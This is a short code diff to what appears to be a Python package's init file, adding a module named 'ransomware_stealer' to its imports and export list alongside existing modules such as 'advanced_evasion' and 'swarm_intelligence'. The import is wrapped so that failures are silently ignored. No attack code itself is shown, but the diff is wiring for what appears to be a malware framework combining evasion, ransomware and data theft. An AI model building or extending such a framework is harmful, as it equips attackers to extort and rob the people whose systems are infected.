@@ -21,6 +21,7 @@ try:
     from . import module_loader
     from . import file_manager
     from . import advanced_evasion
+    from . import ransomware_stealer
 except ImportError as e:
     pass
 
@@ -33,5 +34,6 @@ __all__ = [
     'swarm_intelligence',
     'module_loader',
     'file_manager',
-    'advanced_evasion'
+    'advanced_evasion',
+    'ransomware_stealer'
 ] 
